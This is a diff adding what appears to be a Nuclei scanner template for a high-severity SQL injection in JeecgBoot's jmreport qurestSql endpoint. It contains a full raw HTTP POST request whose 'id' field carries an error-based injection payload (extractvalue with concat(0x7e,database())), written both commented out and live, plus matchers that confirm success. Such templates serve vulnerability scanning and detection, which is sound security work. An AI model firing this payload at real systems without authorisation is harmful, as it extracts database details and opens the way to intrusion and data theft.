@@ -1,0 +1,47 @@
+id: jeecg-boot-jmreport-qurestSql-sqli
+
+info:
+  name: JeecgBoot-qurestSql-sqli
+  author: carrypan
+  severity: high
+
+http:
+  # - raw:
+  #     - |-
+  #       POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
+  #       Host: {{Hostname}}
+  #       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+  #       Content-Type: application/json;charset=UTF-8
+  #       Content-Length: 127
+
+  #       {"apiSelectId":"1290104038414721025","id":"1' and extractvalue(1,concat(0x7e,database()))and id='1"}
+          
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         # - 'contains(body, "XPATH syntax error:")'
+  #         - 'contains(body, "success")'
+  #         - 'contains(body, "SQL")'
+  #         - 'contains(header, "application/json")'
+  #         - 'status_code == 200'
+  #       condition: and
+  - raw:
+      - |-
+        POST /jmreport/qurestSql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Content-Type: application/json;charset=UTF-8
+        Content-Length: 127
+
+        {"apiSelectId":"1290104038414721025","id":"1' and extractvalue(1,concat(0x7e,database()))and id='1"}
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          # - 'contains(body, "XPATH syntax error:")'
+          - 'contains(body, "success")'
+          - 'contains(body, "SQL")'
+          - 'contains(header, "application/json")'
+          - 'status_code == 200'
+        condition: and
